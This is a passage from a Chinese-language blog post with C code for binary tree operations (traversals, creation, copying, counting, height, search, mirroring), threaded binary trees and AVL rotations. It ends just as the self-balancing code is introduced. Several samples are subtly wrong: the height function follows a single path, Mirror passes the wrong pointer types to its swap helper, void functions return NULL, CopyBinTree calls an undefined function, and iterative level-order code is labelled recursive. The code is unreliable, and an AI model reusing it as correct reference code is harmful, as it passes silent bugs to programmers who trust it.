<h3 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h3><p>若二叉树非空，则依次执行如下操作：<br>⑴ 访问根结点；<br>⑵ 遍历左子树；<br>⑶ 遍历右子树。<br>递归算法实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrder</span><span class="params">(BTNode* pRoot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pRoot)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c "</span>, pRoot-&gt;_data);</span><br><span class="line">		PreOrder(pRoot-&gt;_pLeft);</span><br><span class="line">		PreOrder(pRoot-&gt;_pRight);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h3><p>若二叉树非空，则依次执行如下操作：<br>⑴ 遍历左子树；<br>⑵ 访问根结点；<br>⑶ 遍历右子树。<br>递归算法实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrder</span><span class="params">(BTNode* pRoot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pRoot)</span><br><span class="line">	&#123;</span><br><span class="line">		InOrder(pRoot-&gt;_pLeft);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c "</span>, pRoot-&gt;_data);</span><br><span class="line">		InOrder(pRoot-&gt;_pRight);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h3><p>若二叉树非空，则依次执行如下操作：<br>⑴ 遍历左子树；<br>⑵ 遍历右子树；<br>⑶ 访问根结点。<br>递归算法实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrder</span><span class="params">(BTNode* pRoot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pRoot)</span><br><span class="line">	&#123;</span><br><span class="line">		PostOrder(pRoot-&gt;_pLeft);</span><br><span class="line">		PostOrder(pRoot-&gt;_pRight);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c "</span>, pRoot-&gt;_data);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h3><p>除了以上三种以根节点相对于它的左右孩子的访问顺序定义的遍历算法之外，二叉树还有一种遍历方式，就是层序遍历。<br>递归算法实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LevelOrder</span><span class="params">(BTNode* pRoot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(pRoot == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	Queue q;</span><br><span class="line">	QueueInit(&amp;q);</span><br><span class="line">	QueuePush(&amp;q, pRoot);</span><br><span class="line">	<span class="keyword">while</span>(!QueueEmpty(&amp;q))</span><br><span class="line">	&#123;</span><br><span class="line">		pRoot = QueueFront(&amp;q);</span><br><span class="line">		QueuePop(&amp;q);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c "</span>, pRoot-&gt;_data);</span><br><span class="line">		<span class="keyword">if</span>(pRoot-&gt;_pLeft!=<span class="literal">NULL</span>)</span><br><span class="line">			QueuePush(&amp;q, pRoot-&gt;_pLeft);</span><br><span class="line">		<span class="keyword">if</span>(pRoot-&gt;_pRight!=<span class="literal">NULL</span>)</span><br><span class="line">			QueuePush(&amp;q, pRoot-&gt;_pRight);</span><br><span class="line">	&#125;</span><br><span class="line">	QueueDestroy(&amp;q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>reference:<a href="https://blog.csdn.net/monster_ii/article/details/82115772" target="_blank" rel="noopener">二叉树的前中后和层序遍历详细图解(递归和非递归写法)</a></p>
<h2 id="新建一个树节点"><a href="#新建一个树节点" class="headerlink" title="新建一个树节点"></a>新建一个树节点</h2><p>C 语言实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BTNode* <span class="title">BuyNewNode1</span><span class="params">(BTDataType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BTNode* root = (BTNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BTNode));</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		assert(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	root-&gt;_data = data;</span><br><span class="line">	root-&gt;_pLeft = <span class="literal">NULL</span>;</span><br><span class="line">	root-&gt;_pRight = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="创建二叉树"><a href="#创建二叉树" class="headerlink" title="创建二叉树"></a>创建二叉树</h2><p>C 语言实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BTNode * _CreateBinTree(BTDataType * <span class="built_in">array</span>, <span class="keyword">int</span> size, <span class="keyword">int</span>* index,BTDataType invalid)</span><br><span class="line">&#123;</span><br><span class="line">	BTNode* pRoot = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> ((*index) &lt; size &amp;&amp; invalid != <span class="built_in">array</span>[*index] )</span><br><span class="line">	&#123;</span><br><span class="line">		pRoot = BuyNewNode1(<span class="built_in">array</span>[*index]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//创建左子树；</span></span><br><span class="line">		++(*index);</span><br><span class="line">		pRoot-&gt;_pLeft = _CreateBinTree(<span class="built_in">array</span>, size, index,invalid);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//创建右子树</span></span><br><span class="line">		++(*index);</span><br><span class="line">		pRoot-&gt;_pRight = _CreateBinTree(<span class="built_in">array</span>, size, index,invalid);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pRoot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BTNode* <span class="title">CreateBinTree</span><span class="params">(BTDataType* <span class="built_in">array</span>, <span class="keyword">int</span> size, BTDataType invalid)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span>  _CreateBinTree(<span class="built_in">array</span>, size, &amp;index, invalid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="拷贝二叉树"><a href="#拷贝二叉树" class="headerlink" title="拷贝二叉树"></a>拷贝二叉树</h2><p>C 语言实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BTNode* <span class="title">CopyBinTree</span><span class="params">(BTNode* pRoot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BTNode* newpRoot = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (pRoot == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	newpRoot = BuyBinTreeNode(pRoot-&gt;_data);</span><br><span class="line">	newpRoot-&gt;_pLeft = CopyBinTree(pRoot-&gt;_pLeft);</span><br><span class="line">	newpRoot-&gt;_pRight = CopyBinTree(pRoot-&gt;_pRight);</span><br><span class="line">	<span class="keyword">return</span> newpRoot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="删除二叉树"><a href="#删除二叉树" class="headerlink" title="删除二叉树"></a>删除二叉树</h2><p>C 语言递归实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestroyBinTree</span><span class="params">(BTNode** pRoot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (*pRoot)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//递归删除左子树</span></span><br><span class="line">		DestroyBinTree(&amp;((*pRoot)-&gt;_pLeft));</span><br><span class="line">		<span class="comment">//递归删除右子树</span></span><br><span class="line">		DestroyBinTree(&amp;((*pRoot)-&gt;_pRight));</span><br><span class="line">		<span class="built_in">free</span>(*pRoot);</span><br><span class="line">		*pRoot = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取二叉树全部的节点个数"><a href="#获取二叉树全部的节点个数" class="headerlink" title="获取二叉树全部的节点个数"></a>获取二叉树全部的节点个数</h2><p>C 语言递归实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int GetBinTreeSize(BTNode* pRoot)</span><br><span class="line">&#123;</span><br><span class="line">	if (pRoot)</span><br><span class="line">		return GetBinTreeSize(pRoot-&gt;_pLeft) + GetBinTreeSize(pRoot-&gt;_pRight) + 1;</span><br><span class="line">	else</span><br><span class="line">		return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取二叉树中叶子节点个数"><a href="#获取二叉树中叶子节点个数" class="headerlink" title="获取二叉树中叶子节点个数"></a>获取二叉树中叶子节点个数</h2><p>C 语言递归实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetLeafCount</span><span class="params">(BTNode* pRoot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pRoot == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (pRoot-&gt;_pLeft == <span class="literal">NULL</span> &amp;&amp; pRoot-&gt;_pRight == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> GetLeafCount(pRoot-&gt;_pLeft) + GetLeafCount(pRoot-&gt;_pRight);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取二叉树深度-高度"><a href="#获取二叉树深度-高度" class="headerlink" title="获取二叉树深度(高度)"></a>获取二叉树深度(高度)</h2><p>C 语言递归实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBinTreeHeight</span><span class="params">(BTNode* pRoot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pRoot == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> height = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (pRoot-&gt;_pLeft || pRoot-&gt;_pRight)</span><br><span class="line">	&#123;</span><br><span class="line">		height++;</span><br><span class="line">		<span class="keyword">if</span> (pRoot-&gt;_pLeft)</span><br><span class="line">			pRoot = pRoot-&gt;_pLeft;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(pRoot-&gt;_pRight)</span><br><span class="line">			pRoot = pRoot-&gt;_pRight;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="在二叉树中搜索值为-X-的节点"><a href="#在二叉树中搜索值为-X-的节点" class="headerlink" title="在二叉树中搜索值为 X 的节点"></a>在二叉树中搜索值为 X 的节点</h2><p>C 语言递归实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BTNode* <span class="title">BinaryTreeFind</span><span class="params">(BTNode* root, BTDataType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(root-&gt;_data == x)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> root;</span><br><span class="line">	&#125;</span><br><span class="line">	BTNode* tmp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//递归从左子树往下找</span></span><br><span class="line">	<span class="keyword">if</span> (tmp = BinaryTreeFind(root-&gt;_pLeft, x))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//左子树从右子树找，右子树找到直接返回</span></span><br><span class="line">	<span class="keyword">return</span> BinaryTreeFind(root-&gt;_pRight, x);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="镜像翻转二叉树"><a href="#镜像翻转二叉树" class="headerlink" title="镜像翻转二叉树"></a>镜像翻转二叉树</h2><p>C 语言递归实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BinaryTreeSwap</span><span class="params">(BTNode** pleft, BTNode ** pright)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BTNode * tmpNode = *pleft;</span><br><span class="line">	*pleft = *pright;</span><br><span class="line">	*pright = tmpNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Mirror</span><span class="params">(BTNode* pRoot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pRoot == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BinaryTreeSwap(pRoot-&gt;_pLeft, pRoot-&gt;_pRight);</span><br><span class="line">	Mirror(pRoot-&gt;_pLeft);</span><br><span class="line">	Mirror(pRoot-&gt;_pRight);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="学习并实现树的相关结构"><a href="#学习并实现树的相关结构" class="headerlink" title="学习并实现树的相关结构"></a>学习并实现树的相关结构</h1><h2 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h2><p><strong>Reference:<a href="http://data.biancheng.net/view/28.html" target="_blank" rel="noopener">线索二叉树的创建及遍历(C 语言实现)</a></strong><br>在使用二叉链表的普通二叉树中，对于 n 个结点的二叉树，在二叉链存储结构中有 n+1 个空链域。这些空链域放着不用，是对空间的浪费。<br>如果算法中多次涉及到对二叉树的遍历，普通的二叉树就需要使用栈结构做重复性的操作。<br>因此，如果使用二叉树中空闲的内存空间记录某些结点的前趋和后继元素的位置（不是全部）。这样在算法后期需要遍历二叉树时，就可以利用保存的结点信息，提高了遍历的效率。<br>使用这种方法构建的二叉树，即为“线索二叉树”。</p>
<p>线索二叉树中，如果结点有左子树，则 lchild 指针域指向左孩子，否则 lchild 指针域指向该结点的直接前趋；同样，如果结点有右子树，则 rchild 指针域指向右孩子，否则 rchild 指针域指向该结点的直接后继。<br>为了避免指针域指向的结点的意义混淆，需要改变结点本身的结构，增加两个标志域，如下图所示<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/2-1FS0145G0526.png" alt="线索二叉树中的结点结构"></p>
<p>其中，LTag 和 RTag 为标志域。实际上就是两个布尔类型的变量：</p>
<ul>
<li>LTag 值为 0 时，表示 lchild 指针域指向的是该结点的左孩子；为 1 时，表示指向的是该结点的直接前趋结点；</li>
<li>RTag 值为 0 时，表示 rchild 指针域指向的是该结点的右孩子；为 1 时，表示指向的是该结点的直接后继结点。<br>结点结构代码实现(C):</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TElemType int<span class="comment">//宏定义，结点中数据域的类型</span></span></span><br><span class="line"><span class="comment">//枚举，Link为0，Thread为1</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> PointerTag&#123;</span><br><span class="line">    Link,</span><br><span class="line">    Thread</span><br><span class="line">&#125;PointerTag;</span><br><span class="line"><span class="comment">//结点结构构造</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiThrNode</span>&#123;</span></span><br><span class="line">    TElemType data;<span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiThrNode</span>* <span class="title">lchild</span>,*<span class="title">rchild</span>;</span><span class="comment">//左孩子，右孩子指针域</span></span><br><span class="line"></span><br><span class="line">    PointerTag Ltag,Rtag;<span class="comment">//标志域，枚举类型</span></span><br><span class="line">&#125;BiThrNode,*BiThrTree;</span><br></pre></td></tr></table></figure>

<p>表示二叉树时，像以上结点结构构成的二叉链表，被称为线索链表；构建的二叉树称为线索二叉树。</p>
<h3 id="将普通二叉树转化为线索二叉树"><a href="#将普通二叉树转化为线索二叉树" class="headerlink" title="将普通二叉树转化为线索二叉树"></a>将普通二叉树转化为线索二叉树</h3><p>大致思路：在遍历过程中，如果当前结点没有左孩子，需要将该结点的 lchild 指针指向遍历过程中的前一个结点，所以在遍历过程中，设置一个指针（名为 pre ），时刻指向当前访问结点的前一个结点。rchlid 也同样处理<br>C 语言实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//中序对二叉树进行线索化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InThreading</span><span class="params">(BiThrTree p)</span></span>&#123;</span><br><span class="line">    <span class="comment">//如果当前结点存在</span></span><br><span class="line">    <span class="keyword">if</span> (p) &#123;</span><br><span class="line">        InThreading(p-&gt;lchild);<span class="comment">//递归当前结点的左子树，进行线索化</span></span><br><span class="line">        <span class="comment">//如果当前结点没有左孩子，左标志位设为1，左指针域指向上一结点 pre</span></span><br><span class="line">        <span class="keyword">if</span> (!p-&gt;lchild) &#123;</span><br><span class="line">            p-&gt;Ltag=Thread;</span><br><span class="line">            p-&gt;lchild=pre;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果 pre 没有右孩子，右标志位设为 1，右指针域指向当前结点。</span></span><br><span class="line">        <span class="keyword">if</span> (!pre-&gt;rchild) &#123;</span><br><span class="line">            pre-&gt;Rtag=Thread;</span><br><span class="line">            pre-&gt;rchild=p;</span><br><span class="line">        &#125;</span><br><span class="line">        pre=p;<span class="comment">//线索化完左子树后，让pre指针指向当前结点</span></span><br><span class="line">        InThreading(p-&gt;rchild);<span class="comment">//递归右子树进行线索化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="线索二叉树的遍历"><a href="#线索二叉树的遍历" class="headerlink" title="线索二叉树的遍历"></a>线索二叉树的遍历</h3><p>下图是一个按照中序遍历建立的线索二叉树。其中，实线表示指针，指向的是左孩子或者右孩子。虚线表示线索，指向的是该结点的直接前趋或者直接后继。</p>
<p>使用线索二叉树时，会经常遇到一个问题，如图 3 中，结点 b 的直接后继直接通过指针域获得，为结点 _ ；而由于结点 _ 的度为 2 ，无法利用指针域指向后继结点，整个链表断掉了。当在遍历过程，遇到这种问题是解决的办法就是：寻找先序、中序、后序遍历的规律，找到下一个结点。</p>
<p>在先序遍历过程中，如果结点因为有右孩子导致无法找到其后继结点，如果结点有左孩子，则后继结点是其左孩子；否则，就一定是右孩子。拿图 3 举例，结点 + 的后继结点是其左孩子结点 a ，如果结点 a 不存在的话，就是结点 * 。</p>
<p>在中序遍历过程中，结点的后继是遍历其右子树时访问的第一个结点，也就是右子树中位于最左下的结点。例如图 3 中结点 * ，后继结点为结点 c ，是其右子树中位于最左边的结点。反之，结点的前趋是左子树最后访问的那个结点。</p>
<p>后序遍历中找后继结点需要分为 3 种情况：<br>如果该结点是二叉树的根，后继结点为空；<br>如果该结点是父结点的右孩子（或者是左孩子，但是父结点没有右孩子），后继结点是父结点；<br>如果该结点是父结点的左孩子，且父结点有右子树，后继结点为父结点的右子树在后序遍历列出的第一个结点。<br>使用后序遍历建立的线索二叉树，在真正使用过程中遇到链表的断点时，需要访问父结点，所以在初步建立二叉树时，宜采用三叉链表做存储结构。<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="线索二叉树"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//中序遍历线索二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderThraverse_Thr</span><span class="params">(BiThrTree p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//一直找左孩子，最后一个为中序序列中排第一的</span></span><br><span class="line">        <span class="keyword">while</span>(p-&gt;Ltag == Link)&#123;</span><br><span class="line">            p = p-&gt;lchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c "</span>, p-&gt;data);  <span class="comment">//操作结点数据</span></span><br><span class="line">        <span class="comment">//当结点右标志位为1时，直接找到其后继结点</span></span><br><span class="line">        <span class="keyword">while</span>(p-&gt;Rtag == Thread &amp;&amp; p-&gt;rchild !=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            p = p-&gt;rchild;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c "</span>, p-&gt;data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//否则，按照中序遍历的规律，找其右子树中最左下的结点，也就是继续循环遍历</span></span><br><span class="line">        p = p-&gt;rchild;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="平衡二叉树（AVL-Tree）"><a href="#平衡二叉树（AVL-Tree）" class="headerlink" title="平衡二叉树（AVL Tree）"></a>平衡二叉树（AVL Tree）</h2><h3 id="平衡二叉树的定义"><a href="#平衡二叉树的定义" class="headerlink" title="平衡二叉树的定义"></a>平衡二叉树的定义</h3><p>平衡二叉树指的是要么它本身是一个空树，要么它是一个左子树和右子树的深度之差的绝对值不大于 1，并且保证左右子树都是平衡树，下图就是一个平衡二叉树。从图中我们可以看出，一个结点的高度位 1 则表明为其叶子结点到父结点的高度，整颗树的高度取决于最深叶子结点到根结点的距离。<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="平衡二叉树"><br>由于 AVL 树操作中有许多的操作需要向上进行，所以数据结构应这样设计：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">treeNode</span>&#123;</span></span><br><span class="line">	<span class="keyword">char</span> key;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	<span class="comment">//平衡因子，-1，0，1为合理值</span></span><br><span class="line">	<span class="keyword">int</span> balanceFactor;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">treeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">treeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">    <span class="comment">//父节点，方便向上的操作进行</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">treeNode</span> *<span class="title">Parent</span>;</span></span><br><span class="line">&#125;AVLTree,*PAVLTree;</span><br></pre></td></tr></table></figure>

<h3 id="平衡二叉树的操作"><a href="#平衡二叉树的操作" class="headerlink" title="平衡二叉树的操作"></a>平衡二叉树的操作</h3><p>AVL 树的查找操作和普通的二叉树的查找基本一致，但是插入和删除操作有所不同，因为插入和删除会减少树的结点并且改变树的结构，这个时候为了使树始终保持平衡状态我们需要对树进行重构使其始终保持平衡状态，一般这个操作叫做旋转操作（rotation），旋转分为左旋转和右旋转等。我们需要使用旋转操作使得在插入和删除操作之后使二叉平衡树在插入和删除某结点之后依然保持平衡。</p>
<h4 id="旋转操作"><a href="#旋转操作" class="headerlink" title="旋转操作"></a>旋转操作</h4><p>旋转的操作主要有左旋转和右旋转。旋转操作的基本原理都一样，最终目的就是为了让二叉平衡树在被操作之后再次达到平衡。</p>
<h5 id="左旋转"><a href="#左旋转" class="headerlink" title="左旋转"></a>左旋转</h5><p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E5%B7%A6%E6%97%8B%E8%BD%AC.png" alt="左旋转"><br>在上图所表示的左旋转操作中，我们假设的是 x &lt; y &lt; z，因为树不平衡了，我们执行左旋转，将 x 及其左子树进行左旋转，并且将原本 y 的左子树变为 x 的右子树，这里需要注意的两点，</p>
<ul>
<li>① 就是我们需要寻找到三个点，这三个点的大小是有排序的，如这此段开头所说道的 xyz 的关系，将中间那个值作为新的中心结点，然后再进行旋转操作。</li>
<li>② 就是一定要确保所有的左右子树遵循二叉树的定义要求，既左子树一定要永远都是小于其父结点的，而右子树始终大于父结点的。<br>C 语言实现：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PAVLTree <span class="title">leftRotate</span><span class="params">(PAVLTree Node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PAVLTree Temp = Node-&gt;right;</span><br><span class="line">	Node-&gt;right = Temp-&gt;left;</span><br><span class="line">	Temp-&gt;left = Node;</span><br><span class="line">	Temp-&gt;Parent = Node-&gt;Parent;</span><br><span class="line">	<span class="keyword">if</span>(Temp-&gt;left)</span><br><span class="line">		Temp-&gt;left-&gt;Parent = Temp;</span><br><span class="line">	<span class="keyword">if</span>(Temp-&gt;right)</span><br><span class="line">		Temp-&gt;right-&gt;Parent = Temp;</span><br><span class="line">	<span class="keyword">if</span>(Node-&gt;left)</span><br><span class="line">		Node-&gt;left-&gt;Parent = Node;</span><br><span class="line">	<span class="keyword">if</span>(Node-&gt;right)</span><br><span class="line">		Node-&gt;right-&gt;Parent = Node;</span><br><span class="line">	<span class="keyword">return</span> Temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="右旋转"><a href="#右旋转" class="headerlink" title="右旋转"></a>右旋转</h5><p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E5%8F%B3%E6%97%8B%E8%BD%AC.png" alt="右旋转"><br>上图所述的三个节点的关系为 z &lt; x &lt; y，因此根据左旋转所描述的我们可以知道 x 应该作为中心结点也就是父结点，然后这里需要进行两次旋转才能使二叉树最终处于平衡，首先是先对 z 进行左旋转，将 z 变为 x 的左子树，然后再对 y 进行右旋转，在这个过程中，x 的左子树变为 z 的右子树，而右子树则成为了 y 的左子树。<br>C 语言实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PAVLTree <span class="title">rightRotate</span><span class="params">(PAVLTree Node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">		PAVLTree Temp = Node-&gt;left;</span><br><span class="line">	Node-&gt;left = Temp-&gt;right;</span><br><span class="line">	Temp-&gt;right = Node;</span><br><span class="line">	Temp-&gt;Parent = Node-&gt;Parent;</span><br><span class="line">	<span class="keyword">if</span>(Temp-&gt;left)</span><br><span class="line">		Temp-&gt;left-&gt;Parent = Temp;</span><br><span class="line">	<span class="keyword">if</span>(Temp-&gt;right)</span><br><span class="line">		Temp-&gt;right-&gt;Parent = Temp;</span><br><span class="line">	<span class="keyword">if</span>(Node-&gt;left)</span><br><span class="line">		Node-&gt;left-&gt;Parent = Node;</span><br><span class="line">	<span class="keyword">if</span>(Node-&gt;right)</span><br><span class="line">		Node-&gt;right-&gt;Parent = Node;</span><br><span class="line">	<span class="keyword">return</span> Temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="自旋转"><a href="#自旋转" class="headerlink" title="自旋转"></a>自旋转</h5><p>在实现了左旋和右旋操作之后，我们就可以编写一个自平衡函数，来在进行插入和删除操作后自动使二叉树重新达到平衡。<br>在编写自旋转函数之前，我们需要明白我们在插入或者删除的时候可能导致的树的不平衡的所有情况。<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E5%9B%9B%E7%A7%8D%E5%8F%AF%E8%83%BD%E6%83%85%E5%86%B5.png" alt="四种可能情况"><br>情况 1 和 4 是最简单的，我们只需要对结点 Z 进行一个左右的旋转即可，旋转和红黑树的旋转一样。目的是降低子树的高度差。<br>情况 2 和情况 3 需要先对 y 进行左或者右旋转，变成情况 1 和 4，然后再照着情况 1，和 4 处理。<br>其实每次插入删除的时候引起的不平衡的结点都是插入、删除的结点的父节点，不肯是其父节点的兄弟结点之类，而且我们总是通过不平衡结点加上往下的两个结点，来判断出事情况几。往下的结点怎么选取呢？<br>选取的规定就是，看刚插入或者删除的结点是在不平衡结点的左子树还是右子树，加入在左子树，那么继续判断刚插入或者删除的结点在该左子树的左子树还是右子树，只需要这么两步就可以判断出情况。代码如下：</p>
